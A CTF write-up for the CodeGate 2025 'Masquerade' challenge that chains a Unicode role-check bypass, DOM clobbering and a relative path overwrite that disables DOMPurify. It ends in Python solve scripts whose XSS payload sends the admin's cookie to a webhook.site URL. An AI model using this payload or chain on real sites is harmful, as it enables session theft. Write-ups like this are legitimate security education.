---
title: CodeGate 2025 CTF - Masquerade writeup
published: 2025-04-02
description: 'A client-side challenge from CodeGate 2025 - 41 solves'
image: ''
tags: [CTF, web, client-side, Dompurify, XSS, Unicode, DOM Clobbering, RPO]
category: 'writeup'
draft: false 
lang: ''
---

> [Link challenge files](https://drive.google.com/file/d/1Fg8NSN-QxAGSlQqwo0gQ8iyHiXwn2Gvv/view?usp=sharing)

# Analyze source code
This challenge is a simple Nodejs service that let you create posts and can report a specific post to admin. In my experience, most of the challenges that has report feature, is vulnerable to client-side bug like XSS, CSRF,...

Let's analyze the source code top-down, starting from the flag:

`utils/report.js`
```js
const viewUrl = async (post_id) => {
    const token = generateToken({ uuid: "codegate2025{test_flag}", role: "ADMIN", hasPerm: true })

    const cookies = [{ "name": "jwt", "value": token, "domain": "localhost" }];

    const browser = await puppeteer.launch({
        executablePath: '/usr/bin/chromium',
        args: ["--no-sandbox"]
    });

    let result = true;

    try {
        await browser.setCookie(...cookies);

        const page = await browser.newPage();

        await page.goto(`http://localhost:3000/post/${post_id}`, { timeout: 3000, waitUntil: "domcontentloaded" });

        await delay(1000);

        const button = await page.$('#delete');
        await button.click();

        await delay(1000);
    } catch (error) {
        console.error("An Error occurred:", error);
        result = false;
    } finally {
        await browser.close();
    }

    return result;
};
```

`routes/report.js`
```js
const { viewUrl } = require('../utils/report');
const { getPostById } = require('../models/postModel');
const { authenticateJWT } = require('../utils/jwt');

router.use(authenticateJWT);

router.get('/:post_id', async (req, res) => {
    const post_id = req.params.post_id;
    const post = getPostById(post_id);

    if (!post) return res.status(404).json({ message: "Post Not Found." });

    let message;
    let code;

    if (req.user.role !== "INSPECTOR") {
        message = "No Permission.";
        code = 403;
    }
    else {
        const result = await viewUrl(post_id);

        message = result ? "Reported." : "Error occurred while check url.";
        code = result ? 200 : 500;
    }

    res.status(code).send(`
        <script nonce="${res.locals.nonce}">
            alert("${message}");
            window.location.href = "/post";
        </script>
    `);
});
```

The flag is in the cookie of the user who has role 'ADMIN' and that user will: first go to `/post/<post-id>` and then click the delete button. In order to get the flag, we have to make an XSS to steal admin cookie -> Be able to use reporting feature -> Has role 'INSPECTOR'

## Be an INSPECTOR/ADMIN
At this endpoint : `/user/role`, any user who has authenticate JWT can change their role, but their role must not be ADMIN or INSPECTOR, also their role must be in the `role_list` array
```js
router.post('/role', authenticateJWT, (req, res) => {
    const { role } = req.body;

    const token = setRole(req.user.uuid, role);
    if (!token) return res.status(400).json({ message: "Invalid Role." });

    res.json({ message: "Role Changed.", token });
});

const role_list = ["ADMIN", "MEMBER", "INSPECTOR", "DEV", "BANNED"];

function checkRole(role) {
    const regex = /^(ADMIN|INSPECTOR)$/i;
    return regex.test(role);
}

const setRole = (uuid, input) => {
    const user = getUser(uuid);

    if (checkRole(input)) return false;
    if (!role_list.includes(input.toUpperCase())) return false;

    users.set(uuid, { ...user, role: input.toUpperCase() });

    const updated = getUser(uuid);

    const payload = { uuid, ...updated }

    delete payload.password;

    const token = generateToken(payload);

    return token;
};
```

A way to bypass this is using [Unicode normaliztion](https://book.hacktricks.wiki/en/pentesting-web/unicode-injection/unicode-normalization.html): [Ref1](https://gosecure.github.io/unicode-pentester-cheatsheet/?language=all&operation=all&query=)
```js
"ADMıN".toUpperCase() == "ADMIN"
"ıNSPECTOR".toUpperCase() == "ıNSPECTOR"
```

## Try to XSS at `/post/<post-id>`
```js
router.get('/:post_id', (req, res) => {
    const post = getPostById(req.params.post_id);

    if (!post) return res.status(404).json({ message: "Post Not Found." });

    res.render('post/view', {
        post,
        isInspector: req.user.role === "INSPECTOR" ? true : false,
        isAdmin: req.user.role === "ADMIN" ? true : false,
        isOwner: post.writer === req.body.uuid ? true : false
    });
});
```

`post/view.ejs`
```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Post</title>
    <link rel="stylesheet" href="/css/style.css">
</head>

<body>
    <div class="container">
        <h1 id="post-title">
            <%= post.title %>
        </h1>
        <div class="user-info">
            <button id="report" class="button danger">Report</button>
            <button id="delete" class="button danger">Delete</button>
        </div>

        <hr>
        <div class="post-content">
            <%- post.content %>
        </div>
        <a href="/post" class="button">Go to Posts</a>
    </div>
    <script nonce="<%= nonce %>">
        <% if (isOwner || isAdmin) { %>
            window.conf = window.conf || {
                deleteUrl: "/post/delete/<%= post.post_id %>"
            };
        <% } else { %>
            window.conf = window.conf || {
                deleteUrl: "/error/role"
            };
        <% } %>

        <% if (isInspector) { %>
            window.conf.reportUrl = "/report/<%= post.post_id %>";
        <% } else { %>
            window.conf.reportUrl = "/error/role";
        <% } %>

        const reportButton = document.querySelector("#report");

        reportButton.addEventListener("click", () => {
            location.href = window.conf.reportUrl;
        });

        const deleteButton = document.querySelector("#delete");

        deleteButton.addEventListener("click", () => {
            location.href = window.conf.deleteUrl;
        });
    </script>
</body>

</html>
```

`index.js`
```js
app.use((req, res, next) => {
    const nonce = crypto.randomBytes(16).toString('hex');

    res.setHeader("X-Frame-Options", "deny");

    if (req.path.startsWith('/admin')) {
        res.setHeader("Content-Security-Policy", `default-src 'self'; script-src 'self' 'unsafe-inline'`);
    } else {
        res.setHeader("Content-Security-Policy", `default-src 'self'; script-src 'nonce-${nonce}'`);
    }

    res.locals.nonce = nonce;

    next();
});
```

We can see that to make a XSS at `/post/<post-id>` is kinda hard because of the CSP, at first I try to use `<base>` tag but it doesn't work, then I see a clue from the js code:

```js
<% if (isOwner || isAdmin) { %>
    window.conf = window.conf || {
        deleteUrl: "/post/delete/<%= post.post_id %>"
    };
<% } else { %>
window.conf = window.conf || {
    deleteUrl: "/error/role"
};
<% } %>

const deleteButton = document.querySelector("#delete");
deleteButton.addEventListener("click", () => {
    location.href = window.conf.deleteUrl;
});
```
We can inject a payload that trigger DOM Clobbering and when the admin user click the delete button, it will redirect to `/admin` page which has more relaxed CSP. An example payload would be:
```html
<a id="conf" name="deleteUrl" href="/admin/test"></a>
<a id="conf"></a>
```
Let have a look at where we can achieve XSS in `/admin` route:

`routes/admin.js`
```js
// TODO : Testing HTML tag functionality for the "/post".
router.get('/test', (req, res) => {
    res.render('admin/test');
});
```

`views/admin/test.js`
```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test Place</title>
</head>

<body>
    <h1 class="post_title"></h1>
    <div class="post_content"></div>
    <div class="error_div"></div>
    <script src="../js/purify.min.js"></script>
    <script>
        function _0x5582(_0x409510, _0xadade8) {
            const _0xed7c16 = _0xf972();
            return _0x5582 = function (_0xe31be7, _0x128541) {
                _0xe31be7 = _0xe31be7 - (0x1b6a + 0x26a * -0xf + 0x9d7);
                let _0x561cef = _0xed7c16[_0xe31be7];
                if (_0x5582['JdbaXF'] === undefined) {
                    var _0x3ec112 = function (_0xb1fd98) {
                        const _0x3e0794 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
                        let _0x41f72f = '',
                            _0x58e59d = '';
                        for (let _0x9bab26 = -0x1 * 0xf93 + -0x1 * 0x1fb4 + 0x2f47, _0xe5342b, _0x135544, _0x93f446 = -0x653 + -0x1130 + 0x1783; _0x135544 = _0xb1fd98['charAt'](_0x93f446++); ~_0x135544 && (_0xe5342b = _0x9bab26 % (0x1cad + -0x37 + -0x1c72) ? _0xe5342b * (0x1f32 + -0x17ca + -0x728) + _0x135544 : _0x135544, _0x9bab26++ % (-0x2501 + 0x8e + 0x2477)) ? _0x41f72f += String['fromCharCode'](0x2b3 * 0x1 + -0x1e75 + 0x1b1 * 0x11 & _0xe5342b >> (-(0x1 * -0x1e21 + -0x14 * 0x1e + -0x5 * -0x67f) * _0x9bab26 & 0xada + -0x121e + 0x74a)) : 0x3ae * -0x7 + 0x23c7 + -0x11d * 0x9) {
                            _0x135544 = _0x3e0794['indexOf'](_0x135544);
                        }
                        for (let _0x5f1add = -0x1ff4 + -0x26 * -0xd8 + -0x1c, _0x4fed1c = _0x41f72f['length']; _0x5f1add < _0x4fed1c; _0x5f1add++) {
                            _0x58e59d += '%' + ('00' + _0x41f72f['charCodeAt'](_0x5f1add)['toString'](-0x682 + -0x1631 + 0x1cc3))['slice'](-(0x1 * 0x1c58 + 0x245 + -0x1e9b));
                        }
                        return decodeURIComponent(_0x58e59d);
                    };
                    const _0xee82a5 = function (_0x10768a, _0x497987) {
                        let _0x4887d2 = [],
                            _0x39bfbb = -0x1b93 + -0x8e3 + 0x2476,
                            _0x572c71, _0x35a9ba = '';
                        _0x10768a = _0x3ec112(_0x10768a);
                        let _0x3eb323;
                        for (_0x3eb323 = 0x2e * 0x81 + 0x7a7 * -0x4 + 0x27a * 0x3; _0x3eb323 < 0x34c * 0x8 + -0x7e * 0x5 + 0xb75 * -0x2; _0x3eb323++) {
                            _0x4887d2[_0x3eb323] = _0x3eb323;
                        }
                        for (_0x3eb323 = -0x147 * 0x18 + 0xb * -0x27a + -0x1cf3 * -0x2; _0x3eb323 < -0xa61 * -0x2 + 0x1f * -0x28 + -0xeea; _0x3eb323++) {
                            _0x39bfbb = (_0x39bfbb + _0x4887d2[_0x3eb323] + _0x497987['charCodeAt'](_0x3eb323 % _0x497987['length'])) % (0x8 * -0x2e4 + 0x3b2 * 0x1 + 0x146e), _0x572c71 = _0x4887d2[_0x3eb323], _0x4887d2[_0x3eb323] = _0x4887d2[_0x39bfbb], _0x4887d2[_0x39bfbb] = _0x572c71;
                        }
                        _0x3eb323 = -0x1401 + -0xce9 + 0x20ea, _0x39bfbb = 0x1cb5 + 0xd78 + 0xe0f * -0x3;
                        for (let _0x304253 = -0xecd * 0x2 + -0x765 + 0x24ff; _0x304253 < _0x10768a['length']; _0x304253++) {
                            _0x3eb323 = (_0x3eb323 + (-0x5 * -0x5c7 + -0x2687 + 0x9a5)) % (-0x124d + 0x2f0 * 0x1 + 0x105d), _0x39bfbb = (_0x39bfbb + _0x4887d2[_0x3eb323]) % (-0x1f5b + -0x1 * -0x18c5 + 0x796), _0x572c71 = _0x4887d2[_0x3eb323], _0x4887d2[_0x3eb323] = _0x4887d2[_0x39bfbb], _0x4887d2[_0x39bfbb] = _0x572c71, _0x35a9ba += String['fromCharCode'](_0x10768a['charCodeAt'](_0x304253) ^ _0x4887d2[(_0x4887d2[_0x3eb323] + _0x4887d2[_0x39bfbb]) % (-0x17c5 * 0x1 + -0x1 * -0x16e5 + -0x50 * -0x6)]);
                        }
                        return _0x35a9ba;
                    };
                    _0x5582['ILuJjk'] = _0xee82a5, _0x409510 = arguments, _0x5582['JdbaXF'] = !![];
                }
                const _0x4101fc = _0xed7c16[-0x1 * 0x1881 + -0x194e + 0x31cf],
                    _0x58ab4f = _0xe31be7 + _0x4101fc,
                    _0x190643 = _0x409510[_0x58ab4f];
                return !_0x190643 ? (_0x5582['aHHKWb'] === undefined && (_0x5582['aHHKWb'] = !![]), _0x561cef = _0x5582['ILuJjk'](_0x561cef, _0x128541), _0x409510[_0x58ab4f] = _0x561cef) : _0x561cef = _0x190643, _0x561cef;
            }, _0x5582(_0x409510, _0xadade8);
        }

        function _0xcc04fc(_0x55da2b, _0x27ac54, _0x21bf17, _0x2f99d8, _0x1e7f46) {
            return _0x5582(_0x27ac54 - 0x2de, _0x1e7f46);
        } (function (_0x45a3dd, _0x475e52) {
            function _0x9e4cbc(_0x1471ea, _0x3b5af6, _0xbcb422, _0x2cd57d, _0x484373) {
                return _0x5582(_0x1471ea - -0x3dd, _0xbcb422);
            }
            const _0x1f6db1 = _0x45a3dd();

            function _0x4cdb16(_0x2fdd48, _0x2db694, _0x48da47, _0x32ea3f, _0x5b4320) {
                return _0x5582(_0x48da47 - 0x141, _0x5b4320);
            }

            function _0x344634(_0x1b53f4, _0x8278c0, _0x11aec1, _0x513727, _0x8cdfed) {
                return _0x5582(_0x513727 - -0x2c3, _0x1b53f4);
            }

            function _0x19211e(_0x14566c, _0x241abe, _0xbad1e1, _0x49e8b1, _0x14b1d5) {
                return _0x5582(_0x241abe - 0x170, _0x14b1d5);
            }

            function _0x32f3db(_0x1ed8b3, _0x1b0e0b, _0x1db867, _0x582698, _0x5aac2f) {
                return _0x5582(_0x1ed8b3 - 0x2d5, _0x5aac2f);
            }
            while (!![]) {
                try {
                    const _0x183cdf = parseInt(_0x32f3db(0x3fd, 0x3e7, 0x3f4, 0x3f4, ')1BZ')) / (-0x6c8 + -0x1456 + -0x1 * -0x1b1f) + parseInt(_0x32f3db(0x403, 0x400, 0x405, 0x3ea, 'ynI^')) / (0x141b + 0x2573 + -0xe63 * 0x4) + parseInt(_0x19211e(0x288, 0x296, 0x2a8, 0x281, 'VK3#')) / (0x260a + -0x81f + 0xae * -0x2c) + parseInt(_0x19211e(0x275, 0x28c, 0x29c, 0x27c, 'c#6&')) / (-0x24d6 + -0x1057 * -0x2 + 0x42c) + -parseInt(_0x344634('M1L@', -0x1be, -0x1a8, -0x1b3, -0x1c1)) / (-0x194e + 0x26dd + -0xd8a) + -parseInt(_0x19211e(0x29a, 0x28f, 0x283, 0x280, 'Zq]@')) / (0xdd7 + -0x1e2e + 0x105d) * (parseInt(_0x9e4cbc(-0x2b1, -0x2ac, 'M1L@', -0x2a4, -0x2b3)) / (0x1f7b * 0x1 + 0xc58 + -0x2bcc)) + parseInt(_0x9e4cbc(-0x2b3, -0x2c2, 'yml3', -0x2cc, -0x2a6)) / (0x1df5 * -0x1 + -0x23e5 + 0x41e2) * (-parseInt(_0x32f3db(0x3f6, 0x3fb, 0x40f, 0x3fe, 'r)L!')) / (0x139 * -0x13 + -0x1f7f + 0x1241 * 0x3));
                    if (_0x183cdf === _0x475e52) break;
                    else _0x1f6db1['push'](_0x1f6db1['shift']());
                } catch (_0xd119d7) {
                    _0x1f6db1['push'](_0x1f6db1['shift']());
                }
            }
        }(_0xf972, 0x1f * 0x1281 + 0x6 * 0x17739 + -0x2216 * 0x2b));

        function _0xf972() {
            const _0x11bf3e = ['WQ8vWPlcRZG', 'W43cNaJcQw5FgXC9WP8', 'WQZdJ3K', 'ymk3W6FdLa', 'bCoisJa', 'W4FdHCo9W4i7', 'W4KNW6RdNCoO', 'ruxcHmkU', 'WOZcTCoYW6VcSq', 'BXVdLrJdPq', 'b8oOW7/dPWe', 'WPFcOCo5W5ldNG', 'DrBdVG', 'A8o/AbldQq', 'WR3dHHxcGCo8qsf0pL7dQae', 'W6i8W7e', 'WObOsmoL', 'WPBdGLxdVNG', 'WO3cUSoY', 'WORcSI7cVZe', 'hSoYm0NdGr3dPfJcOtJcUW0', 'WRSoWOpdOcm', 'WPT0dmoYW4G', 'W4aGeq', 'WRddTqRdRK8', 'WPTzAComsq', 'WPRdTCkQWQhdS8kPdSk4W70nAW', 'W6CMW6BdM8o9', 'CHZdRt3cHG', 'WPm7WRe2W6tdRSoj', 'rZ8GjCoo', 'WPbBW7tdRwC', 'gCorWPJcOuLjW7WlCtObnG', 'W7RcMd/cNXvIjfJdOIr7sG', 'W6CQd13cSa', 'W7JcNtZcLHjInxtdTtHyua', 'u8kXWQWDAq', 'ESkRmeRdUCovDSkjqSoa', 'zvLPWQdcOarAFSkBr1SJ', 'sw1BWRH9', 'lh8Awa', 'tSk5WRpcRZW', 'WQVdUMtdJHBcPCkBWP/dLSkjm8os', 'dKWU', 'W70mmCkqhSkBW6rkW5hdVKZdJG', 'WP1pzmootW', 'xmk2WQlcSbCjW557h8kl', 'kmoYCW', 'gmk8yHBcO2tdMq', 'neNcUhBdKvNdHxldMmo0WO1L', 'B11MWQ3cRN9VqCk6ye8', 'xHRdOYhcKq', 'W6NdKmoNdgeZWQZcHIC+', 'W5FdT8kMWOVcN8khW6SXANHbWOO', 'cCoJW6u', 'WRPJyCoaxa', 'WRCoWPNcUdm', 'W5DfW7xdU2e'];
            _0xf972 = function () {
                return _0x11bf3e;
            };
            return _0xf972();
        }
        const post_title = document[_0x353e86('JN58', 0x25b, 0x254, 0x253, 0x270) + _0x353e86(')1BZ', 0x23c, 0x22e, 0x23a, 0x21a) + _0x353e86('F7&0', 0x229, 0x22c, 0x21d, 0x249)](_0x1f95a3('ZInG', 0x471, 0x467, 0x464, 0x46d) + _0x1f95a3('&FD]', 0x45f, 0x453, 0x458, 0x46b) + 'e'),
            post_content = document[_0x353e86('&FD]', 0x21b, 0x230, 0x243, 0x23d) + _0x187b3b(0x8a, 0x90, 0x98, 0x84, 'F7&0') + _0x1f95a3('eFM*', 0x45e, 0x473, 0x487, 0x471)](_0x187b3b(0x87, 0x97, 0x7a, 0x7b, 'O9(7') + _0x20d6d8(0x235, 'eFM*', 0x24a, 0x226, 0x243) + _0x187b3b(0x97, 0x8c, 0x98, 0xa1, 'r)L!')),
            error_div = document[_0x1f95a3('!wy*', 0x46a, 0x44e, 0x466, 0x465) + _0x187b3b(0x8c, 0x74, 0x9f, 0x7b, 'BOp[') + _0x353e86('&FD]', 0x21a, 0x224, 0x216, 0x231)](_0x20d6d8(0x220, 'bYb!', 0x206, 0x20e, 0x21a) + _0x187b3b(0x9f, 0xa7, 0xae, 0x97, ')1BZ'));

        function _0x20d6d8(_0x58a35b, _0x2ba1d3, _0x4889ca, _0x4ad308, _0x40321b) {
            return _0x5582(_0x58a35b - 0x106, _0x2ba1d3);
        }
        const urlSearch = new URLSearchParams(location[_0x1f95a3('eFM*', 0x42e, 0x454, 0x44a, 0x447) + 'h']),
            title = urlSearch[_0x1f95a3('Zq]@', 0x466, 0x451, 0x479, 0x467)](_0xcc04fc(0x3e9, 0x3ed, 0x3f7, 0x3e5, 'L7G1'));

        function _0x353e86(_0x535530, _0x11a0eb, _0x383951, _0x14787a, _0x1c9716) {
            return _0x5582(_0x383951 - 0x119, _0x535530);
        }

        function _0x187b3b(_0x137120, _0x410ff4, _0x523579, _0x4ea266, _0x29a7de) {
            return _0x5582(_0x137120 - -0x94, _0x29a7de);
        }

        function _0x1f95a3(_0x242e4a, _0xdf6e1b, _0x211c27, _0x237ab5, _0x3adc34) {
            return _0x5582(_0x3adc34 - 0x32f, _0x242e4a);
        }
        const content = urlSearch[_0x20d6d8(0x238, 'yml3', 0x23b, 0x250, 0x240)](_0x20d6d8(0x218, '&yJN', 0x201, 0x204, 0x206) + 'nt');
        if (!title && !content) post_content[_0x20d6d8(0x213, 'TlR*', 0x222, 0x205, 0x204) + _0xcc04fc(0x3dc, 0x3ea, 0x400, 0x3f1, ')1BZ')] = _0x187b3b(0x95, 0x90, 0x86, 0x94, ')1BZ') + _0x353e86('#5L]', 0x238, 0x22d, 0x221, 0x229) + _0xcc04fc(0x420, 0x403, 0x3f1, 0x407, '^eE%') + _0xcc04fc(0x421, 0x421, 0x415, 0x425, 'r)L!') + _0x187b3b(0x7d, 0x79, 0x90, 0x6f, '!wy*');
        else try {
            post_title[_0xcc04fc(0x409, 0x41e, 0x415, 0x406, 'yml3') + _0xcc04fc(0x3fe, 0x418, 0x424, 0x423, 'r)L!')] = DOMPurify[_0x187b3b(0xab, 0xc1, 0xbb, 0x93, 'u[jQ') + _0x187b3b(0x93, 0x95, 0x95, 0x7b, 'iZUw')](title), post_content[_0x20d6d8(0x23a, '!wy*', 0x22f, 0x257, 0x246) + _0x20d6d8(0x22a, '$H!J', 0x22f, 0x221, 0x22f)] = DOMPurify[_0x353e86('pTVF', 0x251, 0x25a, 0x267, 0x273) + _0x187b3b(0x7a, 0x5f, 0x87, 0x80, 'pTVF')](content);
        } catch {
            post_title[_0x353e86('nB@I', 0x24d, 0x23c, 0x220, 0x256) + _0x1f95a3('o6ul', 0x474, 0x475, 0x47a, 0x46c)] = title, post_content[_0x20d6d8(0x23b, 'O9(7', 0x240, 0x252, 0x228) + _0x187b3b(0xa5, 0x98, 0xb1, 0x92, 'c#6&')] = content;
        }
    </script>

</html>
```

After we deobfuscate the js code, it look like this:
```js
const post_title = document.querySelector(".post_title");
const post_content = document.querySelector(".post_content");

const urlSearch = new URLSearchParams(location.search);
const title = urlSearch.get("title");
const content = urlSearch.get("content");

if (!title && !content) {
  post_content.innerHTML = "Usage: ?title=a&content=b";
} else {
  try {
    post_title.innerHTML = DOMPurify.sanitize(title);
    post_content.innerHTML = DOMPurify.sanitize(content);
  } catch {
    post_title.innerHTML = title;
    post_content.innerHTML = content;
  }
}

```
We can see that if somehow, we trigger the catch block, we can inject any html tag we want, one of the ways is use RPO(Relative Path Overwrite) to make the relative path `../js/purify.min.js` failed to load -> Use `/admin/test/?title=` instead of `/admin/test?title=`

# Exploit
```python
import requests
from urllib.parse import quote

# url = "http://localhost:3000"
url = "http://3.35.104.112:3000"
s = requests.Session()
password = "123"

registet = s.post(url + "/auth/register", json={"password": password})
# print(registet.text)

uuid = registet.json()["uuid"]
# print(uuid)

login = s.post(url + "/auth/login", json={"uuid": uuid, "password": password})
# print(login.text)
token = login.json()["token"]
# print(token)

changeRole = s.post(url + "/user/role", json = {"role": "ADMıN"}, cookies={"jwt": token})
print(changeRole.text)
newToken = changeRole.json()["token"]
# print(newToken)

checkRole = s.get(url + "/error/role", cookies={"jwt": newToken})
print(checkRole.text)
setPerm = s.post(url + "/admin/user/perm",json = {"uuid":uuid, "value":True}, cookies={"jwt": newToken})
print(setPerm.text)

loginAgain = s.post(url + "/auth/login", json={"uuid": uuid, "password": password})
# print(loginAgain.text)
finalToken = loginAgain.json()["token"]
print(finalToken)

payload = f"/admin/test/?title=<img src=X onerror=%22location.href='https://webhook.site/c291f103-b60a-43e8-b308-c90fe01443eb/'%2Bdocument.cookie%22>"

asd = {"title": "test", "content": f'<a id="conf" name="deleteUrl" href="{payload}"></a><a id="conf"></a>'}
print(asd["content"])
payloadPost = s.post(url + "/post/write", json=asd, cookies={"jwt": finalToken})

print(payloadPost.text)
postID = payloadPost.json()["post"]["post_id"]
print(postID)

payloadGet = s.get(url + "/post/" + postID, cookies={"jwt": finalToken})
print(payloadGet.text)

changeRole = s.post(url + "/user/role", json = {"role": "ıNSPECTOR"}, cookies={"jwt": token})
print(changeRole.text)
finalFinalToken = changeRole.json()["token"]

reportGetFlag = s.get(url + "/report/"+postID, cookies={"jwt": finalFinalToken})
print(reportGetFlag.text)
```

The above is my first solve script, which works in local when I build the docker container but in the remote server, I kinda stuck at this regex check, I am not sure what the regex is, I try all the things from urlencode, utf-8, eval, base64,... but none of that works. Thanksfully, a sensei in my team solve it simply by just changing the `<a>` tag to `<area>`, kudos to him!

```js
router.post('/write', postGuard, (req, res) => {
    const { title, content } = req.body;

    if (!title || !content) return res.status(400).json({ message: "Please fill title and content." });
    // In the actual code, a SPECIAL filter is prepared for here.
    // if (content.match(filterRegex)) return res.status(403).json({ message: "Hacking Detected!" });

    const post = addPost(req.user, req.body);

    res.json({ message: "Post Saved.", post });
});
```

### Final solve script
```python
import requests
from urllib.parse import quote

# url = "http://localhost:3000"
url = "http://3.35.104.112:3000"
s = requests.Session()
password = "123"

registet = s.post(url + "/auth/register", json={"password": password})
# print(registet.text)

uuid = registet.json()["uuid"]
# print(uuid)

login = s.post(url + "/auth/login", json={"uuid": uuid, "password": password})
# print(login.text)
token = login.json()["token"]
# print(token)

changeRole = s.post(url + "/user/role", json = {"role": "ADMıN"}, cookies={"jwt": token})
print(changeRole.text)
newToken = changeRole.json()["token"]
# print(newToken)

checkRole = s.get(url + "/error/role", cookies={"jwt": newToken})
print(checkRole.text)
setPerm = s.post(url + "/admin/user/perm",json = {"uuid":uuid, "value":True}, cookies={"jwt": newToken})
print(setPerm.text)

loginAgain = s.post(url + "/auth/login", json={"uuid": uuid, "password": password})
# print(loginAgain.text)
finalToken = loginAgain.json()["token"]
print(finalToken)

payload = f"/admin/test/?title=<img src=X onerror=%22location.href='https://webhook.site/c291f103-b60a-43e8-b308-c90fe01443eb/'%2Bdocument.cookie%22>"

asd = {"title": "test", "content": f'<area id="conf" name="deleteUrl" href="{payload}"></area><area id="conf"></area>'}
print(asd["content"])
payloadPost = s.post(url + "/post/write", json=asd, cookies={"jwt": finalToken})

print(payloadPost.text)
postID = payloadPost.json()["post"]["post_id"]
print(postID)

payloadGet = s.get(url + "/post/" + postID, cookies={"jwt": finalToken})
print(payloadGet.text)

changeRole = s.post(url + "/user/role", json = {"role": "ıNSPECTOR"}, cookies={"jwt": token})
print(changeRole.text)
finalFinalToken = changeRole.json()["token"]

reportGetFlag = s.get(url + "/report/"+postID, cookies={"jwt": finalFinalToken})
print(reportGetFlag.text)
```